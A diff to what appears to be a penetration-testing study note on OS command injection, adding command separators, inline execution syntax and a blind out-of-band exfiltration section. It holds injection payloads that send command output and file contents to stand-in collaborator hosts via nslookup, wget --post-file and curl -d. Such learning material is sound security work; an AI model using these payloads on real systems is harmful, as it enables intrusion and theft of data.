@@ -32,6 +32,19 @@ Some useful commands include:
 | Network configuration | ifconfig    | ipconfig /all |
 | Network connections   | netstat -an | netstat -an   |
 | Running processes     | ps -ef      | tasklist      |
+A number of characters can be used as command separators, allowing commands to be chained together such as:
+
+- `&`
+- `&&`
+- `|`
+- `||`
+
+Some only work on Linux such as:
+
+- `;`
+- Newline (`0x0a` or `\n`)
+
+On Linux systems, backticks can also be used or the dollar character to perform inline execution of an injected command within the original command.
 # Simple Command Injection
 
 As an example, a shopping app lets the user view if an item is in stock. The app may query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command such as:
@@ -139,31 +152,44 @@ As an example, there may be a vulnerable parameter in a feedback form that is su
 ![[Collaborator.png]]
 
 Check Collaborator for any DNS requests for successful OAST interaction.
+# Blind Command Injection - OAST Exfiltration
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-# DNS Data Exfiltration
-
-Using backticks and `$command`:
+An out-of-band channel can provide an easy way to exfiltrate the output from injected commands such as:
 
 ```bash
-; nslookup $(whoami).attacker-server.net ;
-; nslookup `whoami`.attacker-server.net ;
+& nslookup `whoami`.COLLABORATOR-PAYLOAD.com &
+```
+
+It can cause a DNS lookup to the domain containing the result of the whoami command:
+
+```http
+username.COLLABORATOR-PAYLOAD.com
+```
+
+For example, there may be a feedback form that provides no content returned back. Try injecting a blind command injection payload to confirm if it is vulnerable:
+
+```bash
+& nslookup COLLABORATOR-PAYLOAD.com #
+```
+
+![[Nslookup.png]]
+
+The same payload can be used with backticks to make it execute another command that appears inside the backticks
+
+```bash
+& nslookup `whoami`.COLLABORATOR-PAYLOAD.com #
+```
+
+![[Whoami.png]]
+
+Another way is by using the `$` syntax instead:
+
+```bash
+& nslookup $(whoami).COLLABORATOR-PAYLOAD.com #
 ```
 # Obfuscation Payloads
 
-The goal here is to learn how the following payload can be obfuscated to bypass filters for data exfiltration. The payloads can be combined when exploiting template injection or other vulnerabilities that use OS command injection.
+The payloads can be combined when exploiting template injection or other vulnerabilities that use OS command injection.
 
 Original payload:
 
@@ -203,4 +229,3 @@ nslookup -q=cname $(cat /home/test).burp.oastify.com
 wget http://burp-collab.com --post-file=/home/test
 curl http://wcq0jo8.oastify.com -d @/home/test
 ```
-
